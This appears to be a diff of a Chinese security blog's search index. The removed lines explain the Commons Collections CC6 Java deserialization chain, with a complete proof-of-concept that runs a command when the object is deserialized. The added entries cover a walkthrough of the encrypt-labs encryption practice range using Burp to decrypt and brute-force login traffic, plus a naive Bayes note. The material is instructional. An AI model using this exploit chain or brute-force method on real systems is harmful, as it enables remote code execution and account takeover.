-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
-                      class="" title="img"
-                > 
-
-<p>看到他的getValue函数，他是map.get(key)</p>
-<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
-<p>然后LazyMap调用get是不是就是上面的</p>
-<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
-<p>那如果key可控为Runtime.class呢</p>
-<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
-<p>就实现RCE了</p>
-<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
-                      class="" title="img"
-                > 
-
-<p>可以看出他可以序列化这个TiedMapEntry</p>
-<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
-<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
-                      class="" title="img"
-                > 
-
-<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
-<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>真的很简单写下来就会发现</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
-                      class="" title="img"
-                > 
-
-<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
-                      class="" title="img"
-                > 
-
-<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
-<p>也写一下代码吧</p>
-<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
-                      class="" title="img"
-                >
-
-<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
-<p>其实这里也可以想想入口怎么样很完美了</p>
-<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
-<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
-                      class="" title="img"
-                >
-
-<p>可以序列化和反序列化</p>
-<p>这里其实跟URL利用hashmap反序列化连起来了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
-                      class="" title="img"
-                >
-
-<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
-                      class="" title="img"
-                >
-
-<p>直接就看到hashCode</p>
-<p>并且key.hashCode()，key还可控啊</p>
-<p>我们观察下他的反序列化readObject</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
-                      class="" title="img"
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
-                      class="" title="img"
-                > 
-
-<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
-<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
-</li>
-<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
-</li>
-<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
-</li>
-</ul>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
-                      class="" title="img"
-                > 
-
-<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
-                      class="" title="img"
-                > 
-
-<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
-<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
-<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
-<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
-                      class="" title="img"
-                > 
-
-<p>然后debug会调用toString</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
-                      class="" title="img"
-                > 
-
-<p>toString调用getValue</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
-                      class="" title="img"
-                > 
-
-<p>map是我们传入的LazyMap对象</p>
-<p>后一步是LazyMap的get(key)函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
-                      class="" title="img"
-                > 
-
-<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
-                      class="" title="img"
-                > 
-
-<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
-                      class="" title="img"
-                > 
-
-<p>这就是我们要加上删除key的操作的原因</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
-                      class="" title="img"
-                > 
-
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
       <tags>
         <tag>反序列化</tag>
       </tags>
@@ -2581,6 +2581,198 @@
 ]]></content>
   </entry>
   <entry>
+    <title>encrypt-labs</title>
+    <url>/2025/03/28/encrypt-labs/</url>
+    <content><![CDATA[<p>项目地址：<code>https://github.com/SwagXz/encrypt-labs</code></p>
+<p>作者：<code>SwagXz</code></p>
+<p>现在日子越来越不好过了，无论攻防、企业src还是渗透项目，总能看到大量的存在加密的网站，XZ师傅的前端加密靶场还是很值得做一做的，环境很贴合实战会遇到的一些情况，本人web小菜鸡练完之后反正是收获颇丰，推荐给各位师傅。</p>
+<p>之前自己在学习前端加解密经常遇到加密解不了的情况；之后慢慢看师傅们的文章，也学到了很多绕过技术，于是写了个简单的靶场，为之后的师傅们铺路学习,加密方式列出了我经常见的8种方式包含非对称加密、对称加密、加签以及禁止重放的测试场景，比如AES、DES、RSA，用于渗透测试加解密练习。希望可以帮助到最近在学习这块知识的师傅，靶场函数.很简单，和实战相比还是差的有点多，不过应该够入门了</p>
+<p>默认密码：admin&#x2F;123456</p>
+<p>js代码被混淆，无混淆地址在url后添加easy.php</p>
+<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p><a class="link"   href="https://github.com/SwagXz/encrypt-labs?tab=readme-ov-file" >https://github.com/SwagXz/encrypt-labs?tab=readme-ov-file<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>所需条件<strong>Nginx+mysql+php8</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222632631.png"
+                      class="" title="image-20250328222632631"
+                > 
+
+<p>phpstudy的软件管理可以安装php8</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222659656.png"
+                      class="" title="image-20250328222659656"
+                > 
+
+<p>开启mysql+nginx</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222729361.png"
+                      class="" title="image-20250328222729361"
+                > 
+
+<p>创建网站，将压缩包解压的网站源码放到www目录下</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222800466.png"
+                      class="" title="image-20250328222800466"
+                > 
+
+<p>然后修改database.php</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222826892.png"
+                      class="" title="image-20250328222826892"
+                > 
+
+<p>修改数据库的账号密码，默认的不是root&#x2F;root</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222910676.png"
+                      class="" title="image-20250328222910676"
+                > 
+
+<p>然后新建一个encryptdb的数据库并且导入.sql数据库执行文件即可。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328222943899.png"
+                      class="" title="image-20250328222943899"
+                > 
+
+<p>账号&#x2F;密码 ： admin&#x2F;123456</p>
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>因为我们需要用到burp抓包且我是虚拟机搭建。网站访问的时候需要使用虚拟机的ip地址去访问网站，burp默认不住啊本地地址，使用未混淆的代码进行初步学习，记得在url加上<em>easy.php</em> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328223220521.png"
+                      class="" title="image-20250328223220521"
+                > 
+
+<p>我们使用爆破的方式去测试吧。模拟我们不知道密码的情况下。</p>
+<ul>
+<li>未加密的网站：直接intruder模块爆棚</li>
+<li>加密的网站：需要将参数进行加密过后再进行爆棚</li>
+</ul>
+<h2 id="AES固定key"><a href="#AES固定key" class="headerlink" title="AES固定key"></a>AES固定key</h2><h3 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h3><p>输入错误密码：admin&#x2F;admin</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328223550356.png"
+                      class="" title="image-20250328223550356"
+                > 
+
+<p>发现本应该为admin&#x2F;admin的参数变成了encryptedData&#x3D;nArXfVdnoe67UzojAPP2X%2B6qSiznLMBAI3a5Bi%2BzlNyFzdExDwmDvIKgDjWWWrZ2</p>
+<p>去前端打上断点看一下加密逻辑</p>
+<p>我的习惯是打开网络请求看一下堆栈。然后再打断点</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328224729178.png"
+                      class="" title="image-20250328224729178"
+                >  
+<p>输入账号密码点击登陆<br>然后点击发起程序就可以看到调用栈了。这里很简单的就可以看出来，onclick进行了点击操作。那sendDataAes就是进行了对数据的加密以及发送操作的，所以我们点进去看一下前端js代码。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328224951380.png"
+                      class="" title="image-20250328224951380"
+                >  
+
+<p>此时我们就可以知道数据被加密的流程。我们可以在控制台尝试一下，不过我们可以先断点获取我们输入的数据被加密前最后一步的格式，直接复制数据。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328225209254.png"
+                      class="" title="image-20250328225209254"
+                > 
+
+<p>jsonData: “{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}”就是我们数据被加密前的格式。然后我们可以复制加密代码放到控制台</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328225458852.png"
+                      class="" title="image-20250328225458852"
+                > 
+
+<p>对比一下burp里面的。发现后续还有url编码，那我们就将他再url编码一下</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328225725550.png"
+                      class="" title="image-20250328225725550"
+                > 
+
+<p>发现一摸一样。所以我们就拿到了他的前端加密方式</p>
+<h3 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h3><p>在burp上安装autoDecoder插件 <a class="link"   href="https://github.com/f0ng/autoDecoder/releases/tag/0.52" >https://github.com/f0ng/autoDecoder/releases/tag/0.52<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328232008002.png"
+                      class="" title="image-20250328232008002"
+                >  
+
+<p>这里一定要保存配置，可以取一个名字为AES_key</p>
+<p>然后配置需要加密的域名</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328235426775.png"
+                      class="" title="image-20250328235426775"
+                > 
+
+<p>这里也要保存，也可以保存为相同的名字AES_key</p>
+<p>然后我们将一个加密的数据包发到repeater那里去看看</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328233202979.png"
+                      class="" title="image-20250328233202979"
+                > 
+
+<p>多出来了一个这个模块</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328233218117.png"
+                      class="" title="image-20250328233218117"
+                > 
+
+<p>自动帮我将数据包解密成原文了，且是对的，然后我们把参数改成原文</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328235457902.png"
+                      class="" title="image-20250328235457902"
+                > 
+
+<p>不用像网上别人那种右上角有个autoRepeater，也不用选中再加密，直接<strong>Send</strong> </p>
+<p>然后修改我们的密码为正确的密码</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328235559831.png"
+                      class="" title="image-20250328235559831"
+                > 
+
+<p>然后我们可以在logger日志这个地方看一下我们加密发的包</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/28/encrypt-labs/image-20250328235938970.png"
+                      class="" title="image-20250328235938970"
+                > 
+
+<p>数据被正确加密了</p>
+]]></content>
+  </entry>
+  <entry>
     <title>gophish钓鱼平台使用</title>
     <url>/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。</p>
@@ -3090,6 +3282,250 @@
       </tags>
   </entry>
   <entry>
+    <title>朴素贝叶斯和拉普拉斯平滑</title>
+    <url>/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/</url>
+    <content><![CDATA[<h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><h2 id="提取特征值"><a href="#提取特征值" class="headerlink" title="提取特征值"></a>提取特征值</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227181713975.png"
+                      class="" title="image-20251227181713975"
+                > 
+
+<p>有一个词汇表，然后根据输入的语句根据出现的次数标记特征值。<em>because出现了1次，故特征值标记为1</em> 由于要训练的数据为n+1，所以会造成训练时间和预测时间过长</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227181955212.png"
+                      class="" title="image-20251227181955212"
+                > 
+
+<h2 id="正负频率提取特征值"><a href="#正负频率提取特征值" class="headerlink" title="正负频率提取特征值"></a>正负频率提取特征值</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227182232413.png"
+                      class="" title="image-20251227182232413"
+                > 
+
+<p>根据每个词在积极的文章和消极的文章中的出现次数来统计，将一条推文转换成3维向量。</p>
+<p><em>如果说根据每个词的频率组成的向量是N纬的话，那可以转换成3维</em> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227182628441.png"
+                      class="" title="image-20251227182628441"
+                > 
+<p>统计方式</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227182729145.png"
+                      class="" title="image-20251227182729145"
+                > 
+
+<h2 id="预处理-1"><a href="#预处理-1" class="headerlink" title="预处理"></a>预处理</h2><h3 id="停用词"><a href="#停用词" class="headerlink" title="停用词"></a>停用词</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227183457397.png"
+                      class="" title="image-20251227183457397"
+                > 
+
+<p>停用词列表里的词需要被删除</p>
+<h3 id="标点符号"><a href="#标点符号" class="headerlink" title="标点符号"></a>标点符号</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227183548924.png"
+                      class="" title="image-20251227183548924"
+                > 
+<p>按需查看是否需要删除标点符号，看是否NLP任务所需要</p>
+<h3 id="提取词干"><a href="#提取词干" class="headerlink" title="提取词干"></a>提取词干</h3><p>提取词干减少词表的形式</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227183756193.png"
+                      class="" title="image-20251227183756193"
+                > 
+
+<p><em>如：tuning去掉ing是由tun，他的动词形式tune变换而来。然后要采取小写的形式</em> </p>
+<p>因为要处理多条推文，所以将得到一个矩阵</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251227184332378.png"
+                      class="" title="image-20251227184332378"
+                > 
+
+<ol>
+<li>构建频率字典。</li>
+<li>初始化矩阵匹配推文数量m，因为是一个3列矩阵，让他为（m，3）的矩阵。</li>
+<li>进行词干提取，以及上面讲的删掉停用词以及一些标点符号，全部转换成小写。</li>
+<li>统计推文正负词频率来提取特征值。</li>
+</ol>
+<h1 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229162123274.png"
+                      class="" title="image-20251229162123274"
+                > 
+
+<p>朴素贝叶斯采用条件概率，I&#x3D;&#x3D;0.24这个意思是I这个单词在happy条件下的概率为0.24.然后对比之下发现。中性词在happy和sad条件下的条件概率几乎相等。他们对情感影响几乎没有。而表达happy和sad的词之间的差距很大。<br><strong>由于beacause只在Positivity的语句中出现，故无法进行概率比较，所以要进行平滑处理。</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
